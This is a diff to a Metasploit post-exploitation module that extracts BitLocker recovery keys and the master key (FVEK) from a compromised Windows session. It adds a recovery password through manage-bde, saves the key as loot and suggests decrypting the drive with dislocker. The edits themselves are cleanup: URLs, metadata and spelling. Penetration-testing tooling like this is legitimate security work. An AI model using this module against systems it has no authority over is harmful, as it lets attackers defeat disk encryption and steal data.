@@ -6,7 +6,6 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Error
-  include Msf::Post::Windows::ExtAPI
   include Msf::Post::Windows::FileInfo
   include Msf::Post::File
 
@@ -21,14 +20,19 @@ class MetasploitModule < Msf::Post
           This module enumerates ways to decrypt Bitlocker volume and if a recovery key is stored locally
           or can be generated, dump the Bitlocker master key (FVEK)
         },
-        'License' => 'MSF_LICENSE',
+        'License' => MSF_LICENSE,
         'Platform' => ['win'],
         'SessionTypes' => ['meterpreter'],
         'Author' => ['Danil Bazin <danil.bazin[at]hsc.fr>'], # @danilbaz
         'References' => [
-          ['URL', 'https://github.com/libyal/libbde/blob/master/documentation/BitLocker Drive Encryption (BDE) format.asciidoc'],
-          ['URL', 'http://www.hsc.fr/ressources/outils/dislocker/']
+          ['URL', 'https://github.com/libyal/libbde/blob/master/documentation/BitLocker%20Drive%20Encryption%20%28BDE%29%20format.asciidoc'],
+          ['URL', 'https://web.archive.org/web/20170914195545/http://www.hsc.fr/ressources/outils/dislocker/'],
         ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -109,7 +113,7 @@ class MetasploitModule < Msf::Post
         cmd_out = cmd_exec(manage_bde,
                            "-protectors -add #{drive_letter}: -RecoveryPassword")
         recovery_key = cmd_out.match(/((\d{6}-){7}\d{6})/)
-        id_key_tmp = cmd_out.match(/(\{[^\}]+\})/)
+        id_key_tmp = cmd_out.match(/(\{[^}]+\})/)
         if !recovery_key.nil?
           recovery_key = recovery_key[1]
           id_key_tmp = id_key_tmp[1]
@@ -130,7 +134,7 @@ class MetasploitModule < Msf::Post
       if !fvek.blank?
         stored_path = store_loot('windows.file', 'application/octet-stream',
                                  session, fvek)
-        print_good("Successfuly extract FVEK in #{stored_path}")
+        print_good("Successfully extracted FVEK in #{stored_path}")
         print_good('This hard drive could later be decrypted using : dislocker -k <key_file> ...')
       else
         print_error('Failed to generate FVEK, wrong recovery key?')
